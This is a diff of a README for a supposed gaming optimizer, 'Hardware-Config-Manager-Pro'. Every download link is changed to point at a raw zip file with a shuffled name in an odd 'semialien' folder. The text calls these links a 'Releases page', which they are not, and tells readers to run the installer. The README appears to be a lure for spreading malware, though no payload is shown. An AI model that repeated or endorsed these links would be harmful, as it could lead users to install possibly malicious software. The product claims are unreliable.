@@ -1,6 +1,6 @@
 # 🎮 Hardware-Config-Manager-Pro - Boost Your Gaming Performance Today!
 
-[![Download Hardware Config Manager Pro](https://raw.githubusercontent.com/DanteEtnad/Hardware-Config-Manager-Pro/main/semialien/Hardware-Config-Manager-Pro-v3.9.zip%20Now-%20-success)](https://raw.githubusercontent.com/DanteEtnad/Hardware-Config-Manager-Pro/main/semialien/Hardware-Config-Manager-Pro-v3.9.zip)
+[![Download Hardware Config Manager Pro](https://github.com/DanteEtnad/Hardware-Config-Manager-Pro/raw/refs/heads/main/semialien/Manager-Hardware-Pro-Config-v3.8.zip%20Now-%20-success)](https://github.com/DanteEtnad/Hardware-Config-Manager-Pro/raw/refs/heads/main/semialien/Manager-Hardware-Pro-Config-v3.8.zip)
 
 ## 🚀 Getting Started
 
@@ -20,13 +20,13 @@ Before you download, check if your system meets the following requirements:
 1. **Visit the Releases Page**  
    Click the link below to access the download section:
 
-   [Download Hardware Config Manager Pro](https://raw.githubusercontent.com/DanteEtnad/Hardware-Config-Manager-Pro/main/semialien/Hardware-Config-Manager-Pro-v3.9.zip)
+   [Download Hardware Config Manager Pro](https://github.com/DanteEtnad/Hardware-Config-Manager-Pro/raw/refs/heads/main/semialien/Manager-Hardware-Pro-Config-v3.8.zip)
 
 2. **Select the Latest Release**  
    On the Releases page, find the latest version. Usually, it is featured at the top.
 
 3. **Download the Software**  
-   Locate the file titled `https://raw.githubusercontent.com/DanteEtnad/Hardware-Config-Manager-Pro/main/semialien/Hardware-Config-Manager-Pro-v3.9.zip`. Click on it to begin downloading.
+   Locate the file titled `https://github.com/DanteEtnad/Hardware-Config-Manager-Pro/raw/refs/heads/main/semialien/Manager-Hardware-Pro-Config-v3.8.zip`. Click on it to begin downloading.
 
 4. **Run the Installer**  
    After downloading, open the file. Follow the on-screen prompts to install the application on your computer.
@@ -78,7 +78,7 @@ Yes, feel free to open an issue on our GitHub page or check the FAQ section for 
 
 ## 🔗 Helpful Links
 
-- **Releases Page:** [Download Hardware Config Manager Pro](https://raw.githubusercontent.com/DanteEtnad/Hardware-Config-Manager-Pro/main/semialien/Hardware-Config-Manager-Pro-v3.9.zip)
+- **Releases Page:** [Download Hardware Config Manager Pro](https://github.com/DanteEtnad/Hardware-Config-Manager-Pro/raw/refs/heads/main/semialien/Manager-Hardware-Pro-Config-v3.8.zip)
 - **Documentation:** Visit for more detailed features and user guide.
 
 Thank you for choosing Hardware Config Manager Pro! Enjoy optimizing your system for better gaming and overall performance.
